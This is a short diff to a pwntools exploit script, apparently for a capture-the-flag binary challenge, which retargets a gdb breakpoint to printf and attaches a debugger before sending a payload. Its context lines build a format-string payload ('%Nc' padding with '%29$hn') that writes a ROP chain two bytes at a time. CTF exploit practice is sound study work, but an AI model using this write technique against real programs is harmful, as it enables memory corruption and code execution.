@@ -8,7 +8,7 @@ context.binary = binary
 context.arch = 'amd64'
 
 s = '''
-b * 0x140b
+b * printf
 c
 '''
 
@@ -91,6 +91,7 @@ for i in range(0, len(payload), 2):
         payload2 += f"%{next_write}c"
     payload2 += f"%29$hn"  # Point to where we want to write
     p.recvuntil(b"begin your challenge\n")
+    gdb.attach(p, s)
     p.send(payload2.encode())
     
     # Now write the actual 2 bytes of our ROP chain
